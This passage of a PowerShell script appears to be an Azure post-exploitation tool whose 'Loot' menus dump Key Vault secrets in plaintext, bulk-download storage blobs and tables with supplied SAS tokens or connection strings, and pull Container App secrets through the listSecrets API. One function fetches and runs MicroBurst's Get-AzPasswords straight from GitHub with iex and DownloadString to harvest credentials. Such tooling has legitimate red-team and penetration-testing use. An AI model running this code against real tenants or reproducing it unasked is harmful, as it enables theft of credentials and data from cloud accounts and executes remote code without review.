                                    Write-Host "$($i + 1). $($secretList[$i])" -ForegroundColor Green
                                }
                                Write-Host "B. Back to vault selection" -ForegroundColor Cyan
                                Write-Host "M. Return to main menu" -ForegroundColor Cyan

                                $selectedSecret = Read-Host "Enter a number to view a secret, 'B', or 'M'"

                                if ($selectedSecret -eq "B") {
                                    break
                                }

                                if ($selectedSecret -eq "M") {
                                    return
                                }

                                if ($selectedSecret -ge 1 -and $selectedSecret -le $secretList.Count) {
                                    $secretName = $secretList[$selectedSecret - 1]
                                    Write-Host "`nViewing content of secret '$secretName'..." -ForegroundColor Yellow

                                    # Retrieve secret content
                                    $secretContent = if ($toolChoice -eq "1") {
                                        az keyvault secret show --vault-name $selectedVault --name $secretName --query "value" -o tsv
                                    } elseif ($toolChoice -eq "2") {
                                        Get-AzKeyVaultSecret -VaultName $selectedVault -Name $secretName -AsPlainText
                                    }

                                    Write-Host "Secret Content: $secretContent" -ForegroundColor Cyan
                                    Write-Host "`nPress any key to return to secret selection..."
                                    [void][System.Console]::ReadKey($true)
                                } else {
                                    Write-Host "Invalid selection, no secret chosen." -ForegroundColor Red
                                }
                            }
                        } else {
                            Write-Host "No secrets found in the Key Vault." -ForegroundColor Red
                        }
                    } catch {
                        Write-Host "Error retrieving secrets: $_" -ForegroundColor Red
                    }
                } else {
                    Write-Host "Invalid selection, no Key Vault chosen." -ForegroundColor Red
                }
            }
        } else {
            Write-Host "No Key Vaults found." -ForegroundColor Red
        }
    }
    catch {
        Write-Host "Error retrieving Key Vaults or secrets: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the Loot menu..."
    [void][System.Console]::ReadKey($true)
}

# Storage submenu
function LootStorageMenu {
    while ($true) {
        Clear-Host
        DisplayHeader
        Write-Host "Storage Menu" -ForegroundColor Cyan
        Write-Host "1. List All Storage Accounts"
        Write-Host "2. List Storage Resources"
        Write-Host "3. List Blobs in Container"
        Write-Host "B. Return to Main Menu"

        $userInput = Read-Host -Prompt "Select an option"
        switch ($userInput) {
            "1" {
                ListStorageAccounts
            }
            "2" {
                ListStorageResources
            }
            "3" {
                ListBlobsInContainer
            }
            "B" {
                return
            }
            default {
                Write-Host "Invalid selection, please try again."
                Write-Host "`nPress any key to continue..."
                [void][System.Console]::ReadKey($true)
            }
        }
    }
}

# Function to list storage accounts
function ListStorageAccounts {
    Clear-Host
    DisplayHeader
    Write-Host "List All Storage Accounts" -ForegroundColor Cyan
    Write-Host "Select tool(s) to use:" -ForegroundColor Yellow
    Write-Host "1. Azure CLI" -ForegroundColor Yellow
    Write-Host "2. Az PS Module" -ForegroundColor Yellow
    Write-Host "4. All" -ForegroundColor Yellow
    $toolChoice = Read-Host

    Start-Sleep -Seconds 2

    try {
        Clear-Host
        DisplayHeader
        
        if ($toolChoice -eq "1" -or $toolChoice -eq "4") {
            Write-Host "AZ CLI output:" -ForegroundColor Magenta
            Write-Host "The following Storage Accounts were found:" -ForegroundColor Cyan
            $cliOutput = az storage account list --query "[].name" -o tsv | Out-String
            Write-Host $cliOutput
        }
        
        if ($toolChoice -eq "2" -or $toolChoice -eq "4") {
            Write-Host "AZ PS Module output:" -ForegroundColor Magenta
            Write-Host "The following Storage Accounts were found:" -ForegroundColor Cyan
            $psOutput = Get-AzStorageAccount | Format-Table | Out-String
            Write-Host $psOutput
        }
    }
    catch {
        Write-Host "Error retrieving storage accounts: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the Loot menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to list storage resources and manage blobs and tables
function ListStorageResources {
    Clear-Host
    DisplayHeader
    Write-Host "List Storage Resources" -ForegroundColor Cyan

    Write-Host "Enter the storage account name:" -ForegroundColor Yellow
    $accountName = Read-Host

    Write-Host "Select authentication method:" -ForegroundColor Yellow
    Write-Host "1. Current Account" -ForegroundColor Yellow
    Write-Host "2. SAS Token" -ForegroundColor Yellow
    Write-Host "3. Connection String" -ForegroundColor Yellow
    $authChoice = Read-Host

    $sasToken = ""
    $connectionString = ""

    if ($authChoice -eq "2") {
        Write-Host "Enter SAS token:" -ForegroundColor Yellow
        $sasToken = Read-Host
    } elseif ($authChoice -eq "3") {
        Write-Host "Enter Connection String:" -ForegroundColor Yellow
        $connectionString = Read-Host
    }

    Start-Sleep -Seconds 2

    try {
        Clear-Host
        DisplayHeader
        Write-Host "Checking storage resources..." -ForegroundColor Magenta

        # Initialize containers and tables as empty to ensure both are checked
        $containers = @()
        $tables = @()

        # Retrieve containers
        try {
            $containers = if ($authChoice -eq "1") {
                az storage container list --account-name $accountName --query "[].{Name:name}" -o tsv --auth-mode login
            } elseif ($authChoice -eq "2") {
                az storage container list --account-name $accountName --sas-token "`"$sasToken`"" --query "[].{Name:name}" -o tsv
            } elseif ($authChoice -eq "3") {
                az storage container list --account-name $accountName --connection-string "$connectionString" --query "[].{Name:name}" -o tsv
            }
        } catch {
            Write-Host "Error retrieving containers: $_" -ForegroundColor Red
        }

        # Retrieve tables
        try {
            $tables = if ($authChoice -eq "1") {
                az storage table list --account-name $accountName -o tsv --auth-mode login
            } elseif ($authChoice -eq "2") {
                az storage table list --account-name $accountName --sas-token "`"$sasToken`"" -o tsv
            } elseif ($authChoice -eq "3") {
                az storage table list --account-name $accountName --connection-string "$connectionString" -o tsv
            }
        } catch {
            Write-Host "Error retrieving tables: $_" -ForegroundColor Red
        }

        $containerList = $containers -split "`n"
        $tableList = $tables -split "`n"

        if ($containerList.Count -gt 0 -or $tableList.Count -gt 0) {
            Write-Host "The following containers and tables were found:" -ForegroundColor Yellow

            if ($containerList.Count -gt 0) {
                Write-Host "Containers:" -ForegroundColor Cyan
                $containerList | ForEach-Object { Write-Host $_ -ForegroundColor Green }
            } else {
                Write-Host "Containers:" -ForegroundColor Cyan
                Write-Host "No containers found." -ForegroundColor Red
            }

            if ($tableList.Count -gt 0) {
                Write-Host "`nTables:" -ForegroundColor Cyan
                $tableList | ForEach-Object { Write-Host $_ -ForegroundColor Green }
            } else {
                Write-Host "`nTables:" -ForegroundColor Cyan
                Write-Host "No tables found." -ForegroundColor Red
            }

            # Decide if digging into containers or tables
            while ($true) {
                Write-Host "`nWould you like to explore containers or tables? Enter C for containers, T for tables, or B to go back to the menu." -ForegroundColor Yellow
                $choice = Read-Host "Select C, T, or B"

                if ($choice -eq "B") {
                    return
                }

                if ($choice -eq "C" -and $containerList.Count -gt 0) {
                    # Dig into container logic
                    while ($true) {
                        Write-Host "Select a container to query blobs:" -ForegroundColor Yellow
                        for ($i = 0; $i -lt $containerList.Count; $i++) {
                            Write-Host "$($i + 1). $($containerList[$i].Trim())" -ForegroundColor Green
                        }
                        Write-Host "B. Back to resource selection" -ForegroundColor Cyan
                        Write-Host "M. Return to main menu" -ForegroundColor Cyan

                        $selectedOption = Read-Host "Enter a number to select a container, B, or M"

                        if ($selectedOption -eq "B") {
                            break
                        }

                        if ($selectedOption -eq "M") {
                            return
                        }

                        if ($selectedOption -ge 1 -and $selectedOption -le $containerList.Count) {
                            $selectedContainer = $containerList[$selectedOption - 1].Trim()
                            Write-Host "`nQuerying blobs in container '$selectedContainer'..." -ForegroundColor Yellow

                            $blobList = if ($authChoice -eq "1") {
                                az storage blob list --account-name $accountName --container-name $selectedContainer --query "[].name" -o tsv --auth-mode login
                            } elseif ($authChoice -eq "2") {
                                az storage blob list --account-name $accountName --container-name $selectedContainer --sas-token "`"$sasToken`"" --query "[].name" -o tsv
                            } elseif ($authChoice -eq "3") {
                                az storage blob list --account-name $accountName --container-name $selectedContainer --connection-string "$connectionString" --query "[].name" -o tsv
                            }

                            $blobs = $blobList -split "`n"
                            if ($blobs.Count -gt 0) {
                                while ($true) {
                                    Write-Host "Select a blob to download, 'A' for all blobs, or 'B' to go back to container selection:" -ForegroundColor Yellow
                                    for ($i = 0; $i -lt $blobs.Count; $i++) {
                                        Write-Host "$($i + 1). $($blobs[$i].Trim())" -ForegroundColor Green
                                    }
                                    Write-Host "A. Download All Blobs" -ForegroundColor Cyan
                                    Write-Host "B. Return to container selection" -ForegroundColor Cyan

                                    $selectedBlob = Read-Host "Enter a number, 'A', or 'B'"

                                    if ($selectedBlob -eq "B") {
                                        break
                                    }

                                    if ($selectedBlob -eq "A") {
                                        $destinationDir = Read-Host "Enter directory to save files or press Enter for current directory"
                                        $destinationDir = if ($destinationDir -eq "") { "." } else { $destinationDir }

                                        foreach ($blobName in $blobs) {
                                            Write-Host "`nDownloading blob '$blobName'..." -ForegroundColor Yellow
                                            $destinationPath = Join-Path -Path $destinationDir -ChildPath $blobName.Trim()

                                            if ($authChoice -eq "1") {
                                                az storage blob download --account-name $accountName --container-name $selectedContainer --name $blobName.Trim() --file $destinationPath --output none --auth-mode login
                                            } elseif ($authChoice -eq "2") {
                                                az storage blob download --account-name $accountName --container-name $selectedContainer --name $blobName.Trim() --sas-token "`"$sasToken`"" --file $destinationPath --output none
                                            } elseif ($authChoice -eq "3") {
                                                az storage blob download --account-name $accountName --container-name $selectedContainer --name $blobName.Trim() --connection-string "$connectionString" --file $destinationPath --output none
                                            }
                                        }
                                        Write-Host "All blobs downloaded to '$destinationDir'" -ForegroundColor Green
                                    } elseif ($selectedBlob -ge 1 -and $selectedBlob -le $blobs.Count) {
                                        $blobName = $blobs[$selectedBlob - 1].Trim()
                                        Write-Host "`nDownloading blob '$blobName'..." -ForegroundColor Yellow
                                        $destinationPath = Read-Host "Enter the file path to save the blob (or press Enter to save as '$blobName' in current directory)"

                                        $destinationPath = if ($destinationPath -eq "") { ".\$blobName" } else { $destinationPath }

                                        if ($authChoice -eq "1") {
                                            az storage blob download --account-name $accountName --container-name $selectedContainer --name $blobName --file $destinationPath --output none --auth-mode login
                                        } elseif ($authChoice -eq "2") {
                                            az storage blob download --account-name $accountName --container-name $selectedContainer --name $blobName --sas-token "`"$sasToken`"" --file $destinationPath --output none
                                        } elseif ($authChoice -eq "3") {
                                            az storage blob download --account-name $accountName --container-name $selectedContainer --name $blobName --connection-string "$connectionString" --file $destinationPath --output none
                                        }

                                        Write-Host "Blob '$blobName' downloaded to '$destinationPath'" -ForegroundColor Green
                                    } else {
                                        Write-Host "Invalid selection." -ForegroundColor Red
                                    }
                                }
                            } else {
                                Write-Host "No blobs found in the container." -ForegroundColor Red
                            }
                        } else {
                            Write-Host "Invalid selection, no container chosen." -ForegroundColor Red
                        }
                    }
                } elseif ($choice -eq "T" -and $tableList.Count -gt 0) {
                    # Dig into table logic
                    while ($true) {
                        Write-Host "Select a table to query or 'B' to go back:" -ForegroundColor Yellow
                        for ($i = 0; $i -lt $tableList.Count; $i++) {
                            Write-Host "$($i + 1). $($tableList[$i].Trim())" -ForegroundColor Green
                        }
                        Write-Host "B. Back to resource selection" -ForegroundColor Cyan
                        Write-Host "M. Return to main menu" -ForegroundColor Cyan

                        $selectedTableOption = Read-Host "Enter a number to select a table or 'B' to go back"

                        if ($selectedTableOption -eq "B") {
                            break
                        }

                        if ($selectedTableOption -eq "M") {
                            return
                        }

                        if ($selectedTableOption -ge 1 -and $selectedTableOption -le $tableList.Count) {
                            $selectedTable = $tableList[$selectedTableOption - 1].Trim()
                            Write-Host "`nQuerying table '$selectedTable'..." -ForegroundColor Yellow

                            # Prompt for the number of entries to display
                            Write-Host "Enter the number of entries to display, or press Enter to show all entries:" -ForegroundColor Yellow
                            $entries = Read-Host
                            $numResultsArg = if ($entries -eq "") { @() } else { @("--num-results", $entries) }

                            # Query table items
                            $tableItems = if ($authChoice -eq "1") {
                               & az storage entity query --account-name $accountName --table-name $selectedTable @($numResultsArg) --auth-mode login -o table | Out-String
                            } elseif ($authChoice -eq "2") {
                               & az storage entity query --account-name $accountName --table-name $selectedTable @($numResultsArg) --sas-token "`"$sasToken`"" -o table | Out-String
                            } elseif ($authChoice -eq "3") {
                               & az storage entity query --account-name $accountName --table-name $selectedTable @($numResultsArg) --connection-string "$connectionString" -o table | Out-String
                            }

                            Write-Host $tableItems -ForegroundColor DarkMagenta
                            Write-Host "`nPress any key to return to table selection..."
                            [void][System.Console]::ReadKey($true)
                        } else {
                            Write-Host "Invalid selection, no table chosen." -ForegroundColor Red
                        }
                    }
                }
            } else {
                Write-Host "No valid selection or resources." -ForegroundColor Red
            }
        } else {
            Write-Host "No containers or tables found in the storage account." -ForegroundColor Red
        }
    }
    catch {
        Write-Host "Error retrieving storage resources: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the storage menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to list blobs in a storage container
function ListBlobsInContainer {
    while ($true) {
        Clear-Host
        DisplayHeader
        Write-Host "List Storage Resources" -ForegroundColor Cyan
        Write-Host "Select tool(s) to use:" -ForegroundColor Yellow
        Write-Host "1. Azure CLI" -ForegroundColor Yellow
        Write-Host "2. Az PS Module (Current Account only)" -ForegroundColor Yellow
        Write-Host "M. Return to Main Menu" -ForegroundColor Yellow
        $toolChoice = Read-Host

        if ($toolChoice -eq "M") {
            return
        }

        Write-Host "Enter the storage account name:" -ForegroundColor Yellow
        $accountName = Read-Host

        while ($true) {
            Write-Host "Do you want to list available containers or provide a container name manually?" -ForegroundColor Yellow
            Write-Host "1. List available containers" -ForegroundColor Yellow
            Write-Host "2. Enter container name manually" -ForegroundColor Yellow
            Write-Host "B. Back to Tool Selection" -ForegroundColor Yellow
            Write-Host "M. Return to Main Menu" -ForegroundColor Yellow
            $operationChoice = Read-Host

            if ($operationChoice -eq "M") {
                return
            }
            if ($operationChoice -eq "B") {
                break
            }

            $containers = @()
            $selectedContainer = ""

            if ($operationChoice -eq "1") {
                if ($toolChoice -eq "1") {
                    Write-Host "Select authentication method:" -ForegroundColor Yellow
                    Write-Host "1. Current Account" -ForegroundColor Yellow
                    Write-Host "2. SAS Token" -ForegroundColor Yellow
                    Write-Host "3. Connection String" -ForegroundColor Yellow
                    $authChoice = Read-Host

                    if ($authChoice -eq "M") {
                        return
                    }
                }

                $sasToken = ""
                $connectionString = ""

                if ($authChoice -eq "2") {
                    Write-Host "Enter SAS token:" -ForegroundColor Yellow
                    $sasToken = Read-Host
                } elseif ($authChoice -eq "3") {
                    Write-Host "Enter Connection String:" -ForegroundColor Yellow
                    $connectionString = Read-Host
                }

                try {
                    if ($toolChoice -eq "1") {
                        Clear-Host
                        DisplayHeader
                        Write-Host "Using Azure CLI to list containers..." -ForegroundColor Magenta
                        if ($authChoice -eq "1") {
                            Write-Host "We need to re-login with the scope https://storage.azure.com/.default" -ForegroundColor Magenta
                            Write-Host "Login interactively or as Service Principal?"
                            Write-Host "1. Interactively" -ForegroundColor Yellow
                            Write-Host "2. Service Princial" -ForegroundColor Yellow
                            $select = Read-Host
                                if ($select -eq "1"){
                                    az login --scope "https://storage.azure.com/.default"
                                }
                                elseif ($select -eq "2"){
                                    Write-Host "Enter the application (client) ID:" -ForegroundColor Yellow
                                    $appId = Read-Host
                                    Write-Host "Enter the client secret:" -ForegroundColor Yellow
                                    $clientSecret = Read-Host
                                    az login --scope "https://storage.azure.com/.default" --service-principal -u $appId -p $clientSecret --tenant $Global:tenantId
                                }
                            $containerOutput = az storage container list --account-name $accountName --query "[].name" -o tsv --auth-mode login
                        }
                        elseif ($authChoice -eq "2") {
                            $containerOutput = az storage container list --account-name $accountName --sas-token "`"$sasToken`"" --query "[].name" -o tsv
                        }
                        elseif ($authChoice -eq "3") {
                            $containerOutput = az storage container list --account-name $accountName --query "[].name" -o tsv --connection-string "$connectionString"
                        }
                        $containers = @($containerOutput -split "`r?`n" | Where-Object { $_ -ne "" })

                    } elseif ($toolChoice -eq "2") {
                        Clear-Host
                        DisplayHeader
                        Write-Host "Using Az PowerShell Module to list containers..." -ForegroundColor Magenta
                        $context = New-AzStorageContext -StorageAccountName $accountName
                        $containerList = Get-AzStorageContainer -Context $context
                        $containers = @($containerList | ForEach-Object { $_.Name })
                    }

                    if ($containers.Count -gt 0) {
                        while ($true) {
                            Write-Host "`nAvailable Containers:" -ForegroundColor Yellow
                            for ($i = 0; $i -lt $containers.Count; $i++) {
                                Write-Host "$($i + 1). $($containers[$i])" -ForegroundColor Green
                            }

                            Write-Host "Select a container or 'B' to go back:" -ForegroundColor Cyan
                            $selectedContainerIndex = Read-Host

                            if ($selectedContainerIndex -eq "B") {
                                break  # Break out of this loop and remain in container selection
                            }

                            if ($selectedContainerIndex -ge 1 -and $selectedContainerIndex -le $containers.Count) {
                                $selectedContainer = $containers[$selectedContainerIndex - 1]
                                Write-Host("The selected container is: $selectedContainer")

                                # Proceed to blobs section
                                $exitToContainerSelection = $false
                                while (-not $exitToContainerSelection) {
                                    $blobs = @()

                                    try {
                                        if ($toolChoice -eq "1") {
                                            Clear-Host
                                            DisplayHeader
                                            Write-Host "Using Azure CLI to list blobs..." -ForegroundColor Magenta
                                            if ($authChoice -eq "1") {
                                                $blobOutput = az storage blob list --account-name $accountName --container-name $selectedContainer --auth-mode login --query "[].name" -o tsv
                                            } elseif ($authChoice -eq "2") {
                                                $blobOutput = az storage blob list --account-name $accountName --container-name $selectedContainer --sas-token "`"$sasToken`"" --query "[].name" -o tsv
                                            } elseif ($authChoice -eq "3") {
                                                $blobOutput = az storage blob list --account-name $accountName --container-name $selectedContainer --connection-string "$connectionString" --query "[].name" -o tsv
                                            }
                                            $blobs = @($blobOutput -split "`r?`n" | Where-Object { $_ -ne "" })

                                        } elseif ($toolChoice -eq "2") {
                                            Clear-Host
                                            # DisplayHeader
                                            Write-Host "Using Az PowerShell Module to list blobs..." -ForegroundColor Magenta
                                            $context = New-AzStorageContext -StorageAccountName $accountName
                                            $blobList = Get-AzStorageBlob -Container $selectedContainer -Context $context
                                            $blobs = @($blobList | ForEach-Object { $_.Name })
                                        }

                                        if ($blobs.Count -gt 0) {
                                            while ($true) {
                                                Write-Host "`nBlobs found:" -ForegroundColor Yellow

                                                for ($i = 0; $i -lt $blobs.Count; $i++) {
                                                    Write-Host "$($i + 1). $($blobs[$i])" -ForegroundColor Green
                                                }

                                                Write-Host "Select a blob to view its content or:"
                                                Write-Host "B. Back to Container List" -ForegroundColor Cyan
                                                Write-Host "M. Return to Main Menu" -ForegroundColor Cyan
                                                $selectedOption = Read-Host

                                                if ($selectedOption -eq "B") {
                                                    $exitToContainerSelection = $true
                                                    break  # Break out to the container list
                                                }
                                                if ($selectedOption -eq "M") {
                                                    return
                                                }

                                                if ($selectedOption -ge 1 -and $selectedOption -le $blobs.Count) {
                                                    $selectedBlob = $blobs[$selectedOption - 1].Trim()

                                                    if ($toolChoice -eq "1") {
                                                        Write-Host "`nViewing content of blob '$selectedBlob' using Azure CLI..." -ForegroundColor Yellow
                                                        az storage blob download --account-name $accountName --container-name $selectedContainer --name $selectedBlob --file "$selectedBlob" --auth-mode login --output none
                                                        Get-Content -Path "$selectedBlob" | Write-Host -ForegroundColor DarkMagenta
                                                    } elseif ($toolChoice -eq "2") {
                                                        Write-Host "`nViewing content of blob '$selectedBlob' using Az PowerShell Module..." -ForegroundColor Yellow
                                                        Get-AzStorageBlobContent -Container $selectedContainer -Blob $selectedBlob -Context $context -Destination "$selectedBlob" -Force
                                                        Get-Content -Path "$selectedBlob" | Write-Host -ForegroundColor DarkMagenta
                                                    }
                                                    Remove-Item -Path "$selectedBlob" -Force
                                                } else {
                                                    Write-Host "Invalid selection, no blob chosen." -ForegroundColor Red
                                                }
                                            }
                                        } else {
                                            Write-Host "No blobs found in the container." -ForegroundColor Red
                                        }
                                    }
                                    catch {
                                        Write-Host "Error retrieving blobs: $_" -ForegroundColor Red
                                    }
                                }
                            } else {
                                Write-Host "Invalid selection, please try again." -ForegroundColor Red
                            }
                        }
                    } else {
                        Write-Host "No containers found or access denied. Please enter container name manually." -ForegroundColor Red
                        continue
                    }
                }
                catch {
                    Write-Host "Error retrieving containers: $_" -ForegroundColor Red
                    continue
                }
            }

            if ($operationChoice -eq "2" -or $selectedContainer -eq "") {
                Write-Host "Enter the container name:" -ForegroundColor Yellow
                $selectedContainer = Read-Host
            }

            if ($selectedContainer -eq "M") {
                return
            }
        }
    }
}

# Container Apps Management Menu
function LootContainerAppsMenu {
    while ($true) {
        Clear-Host
        DisplayHeader
        Write-Host "Container Apps Menu" -ForegroundColor Cyan
        Write-Host "1. List All Container Apps"
        Write-Host "2. Loot Container App"
        Write-Host "B. Return to Main Menu"

        $userInput = Read-Host -Prompt "Select an option"
        switch ($userInput) {
            "1" {
                ListContainerApps
            }
            "2" {
                LootContainerApp
            }
            "B" {
                return
            }
            default {
                Write-Host "Invalid selection, please try again."
                Write-Host "`nPress any key to continue..."
                [void][System.Console]::ReadKey($true)
            }
        }
    }
}

# Function to list all Azure Container Apps
function ListContainerApps {
    Clear-Host
    DisplayHeader
    Write-Host "List All Container Apps" -ForegroundColor Cyan
    Write-Host "Select tool(s) to use:" -ForegroundColor Yellow
    Write-Host "1. Azure CLI" -ForegroundColor Yellow
    Write-Host "2. Az PS Module" -ForegroundColor Yellow
    Write-Host "4. All" -ForegroundColor Yellow
    $toolChoice = Read-Host

    Start-Sleep -Seconds 2

    try {
        Clear-Host
        
        
        if ($toolChoice -eq "1" -or $toolChoice -eq "4") {
            Write-Host "AZ CLI output:" -ForegroundColor Magenta
            Write-Host "The following Container Apps were found:" -ForegroundColor Cyan
            $cliOutput = az containerapp list --query "[].name" -o tsv | Out-String
            Write-Host $cliOutput
        }
        
        if ($toolChoice -eq "2" -or $toolChoice -eq "4") {
            Write-Host "AZ PS Module output:" -ForegroundColor Magenta
            Write-Host "The following Container Apps were found:" -ForegroundColor Cyan
            $psOutput = Get-AzContainerApp | Format-Table | Out-String
            Write-Host $psOutput
        }
    }
    catch {
        Write-Host "Error retrieving container apps: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the container apps menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to loot a Container App
function LootContainerApp {
    Clear-Host
    DisplayHeader
    Write-Host "Manage Specific Container App" -ForegroundColor Cyan

    Write-Host "Select tool(s) to use:" -ForegroundColor Yellow
    Write-Host "1. Azure CLI" -ForegroundColor Yellow
    Write-Host "2. Az PS Module" -ForegroundColor Yellow
    $toolChoice = Read-Host

    Start-Sleep -Seconds 2

    # Store container apps with their resource group names
    $containerAppsDictionary = @{}

    try {
        # List container apps using Azure CLI or Az PowerShell
        if ($toolChoice -eq "1") {
            Write-Host "Fetching Container Apps using Azure CLI..." -ForegroundColor Magenta
            $cliOutput = az containerapp list --query "[].{name:name, rg:resourceGroup}" -o json | ConvertFrom-Json
            foreach ($app in $cliOutput) {
                $containerAppsDictionary[$app.name] = $app.rg
            }
        } elseif ($toolChoice -eq "2") {
            Write-Host "Fetching Container Apps using Az PowerShell Module..." -ForegroundColor Magenta
            $psOutput = Get-AzContainerApp | Select-Object Name, ResourceGroupName
            foreach ($app in $psOutput) {
                $containerAppsDictionary[$app.Name] = $app.ResourceGroupName
            }
        } else {
            Write-Host "Invalid selection, returning to container apps menu." -ForegroundColor Red
            return
        }

        $containerAppNames = @($containerAppsDictionary.Keys)

        if ($containerAppNames.Count -gt 0) {
            while ($true) {
                Write-Host "Select a Container App to manage:" -ForegroundColor Yellow
                for ($i = 0; $i -lt $containerAppNames.Count; $i++) {
                    Write-Host "$($i + 1). $($containerAppNames[$i])" -ForegroundColor Green
                }
                Write-Host "B. Back to Container Apps Menu" -ForegroundColor Cyan
                Write-Host "M. Return to main menu" -ForegroundColor Cyan

                $selectedOption = Read-Host "Enter a number to select a container app, 'B', or 'M'"

                if ($selectedOption -eq "B") {
                    continue
                }

                if ($selectedOption -eq "M") {
                    return
                }

                if ($selectedOption -ge 1 -and $selectedOption -le $containerAppNames.Count) {
                    $selectedApp = $containerAppNames[$selectedOption - 1]
                    $selectedRg = $containerAppsDictionary[$selectedApp]
                    Write-Host "`nManaging Container App '$selectedApp' in Resource Group '$selectedRg'..." -ForegroundColor Yellow

                    if ($toolChoice -eq "1") {
                        $appDetails = az containerapp show --name $selectedApp --resource-group $selectedRg --output json
                    } elseif ($toolChoice -eq "2") {
                        $appDetails = Get-AzContainerApp -Name $selectedApp -ResourceGroupName $selectedRg | ConvertTo-Json
                    }

                    $appDetailsJson = $appDetails | ConvertFrom-Json
                    Write-Host "Name: $($appDetailsJson.name)"
                    Write-Host "Id: $($appDetailsJson.Id)"
                    Write-Host "Secret: $($appDetailsJson.configuration.secret)"
                    Write-Host "Identity Type: $($appDetailsJson.IdentityType)"
                    Write-Host "SP Id: $($appDetailsJson.IdentityPrincipalId)"

                    if ($appDetailsJson.configuration.secret) {
                        Write-Host "Secrets found in configuration. Would you like to list secrets? (Y/N)" -ForegroundColor Yellow
                        $secretChoice = Read-Host
                        if ($secretChoice -eq "Y") {
                            # Construct URI based on app ID
                            $baseUri = "https://management.azure.com"
                            $appId = $appDetailsJson.id
                            $secretUri = "${baseUri}${appId}/listSecrets?api-version=2024-03-01"

                            # Get access token
                            $token = if ($toolChoice -eq "1") {
                                $tokenResponse = az account get-access-token --query accessToken -o tsv
                                $tokenResponse
                            } elseif ($toolChoice -eq "2") {
                                $tokenResponse = Get-AzAccessToken
                                $tokenResponse.Token
                            }

                            # Fetch secrets
                            $headers = @{
                                'Authorization' = "Bearer $token"
                                'Content-Type' = 'application/json'
                            }

                            try {
                                $secrets = Invoke-RestMethod -Uri $secretUri -Method POST -Headers $headers
                                Write-Host "Secrets: " -ForegroundColor Green
                                if ($secrets.value) {
                                    foreach ($secret in $secrets.value) {
                                        Write-Host "Name: $($secret.name)" -ForegroundColor DarkMagenta
                                        Write-Host "Content: $($secret.value)" -ForegroundColor DarkMagenta
                                        # Add any additional properties that might be relevant
                                    }
                                } else {
                                    Write-Host "No secrets found." -ForegroundColor Yellow
                                }
                            }
                            catch {
                                Write-Host "Error fetching secrets: $_" -ForegroundColor Red
                            }
                        }
                    }
                } else {
                    Write-Host "Invalid selection, no Container App chosen." -ForegroundColor Red
                }
            }
        } else {
            Write-Host "No Container Apps found." -ForegroundColor Red
        }
    }
    catch {
        Write-Host "Error managing container apps: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the container apps menu..."
    [void][System.Console]::ReadKey($true)
}

<# 
Function to invoke Get-AzPasswords directly from GitHub https://github.com/NetSPI/MicroBurst/blob/master/Az/Get-AzPasswords.ps1
MicroBurst is provided under the 3-clause BSD license below.

*************************************************************

Copyright (c) 2018, NetSPI
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this
  list of conditions and the following disclaimer.

* Redistributions in binary form must reproduce the above copyright notice,
  this list of conditions and the following disclaimer in the documentation
  and/or other materials provided with the distribution.

* Neither the name of MicroBurst nor the names of its
  contributors may be used to endorse or promote products derived from
  this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
#>
function LootAzPasswords {
    Clear-Host
    DisplayHeader
    Write-Host "Looting possible passwords via MicroBurt's Get-AzPasswords" -ForegroundColor Cyan

    # Download and execute the script 
    # Check if Get-AzPasswords Module is available
    if (Get-Command -Name Get-AzPasswords -ErrorAction SilentlyContinue) {
        Write-Host "Get-AzPasswords is already available." -ForegroundColor Green
    } else {
        Write-Host "Get-AzPasswords is not available." -ForegroundColor Red
        Write-Host "Downloading and running Get-AzPasswords.ps1 from GitHub..." -ForegroundColor Yellow
        iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/MicroBurst/refs/heads/master/Az/Get-AzPasswords.ps1")
    }
    Get-AzPasswords -Verbose | Out-GridView
    
    Write-Host "`nPress any key to return to the Loot menu..."
    [void][System.Console]::ReadKey($true)
}

<#
BSD 3-Clause License

Copyright (c) 2021, Steve Borosh
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this
   list of conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.

3. Neither the name of the copyright holder nor the names of its
   contributors may be used to endorse or promote products derived from
   this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
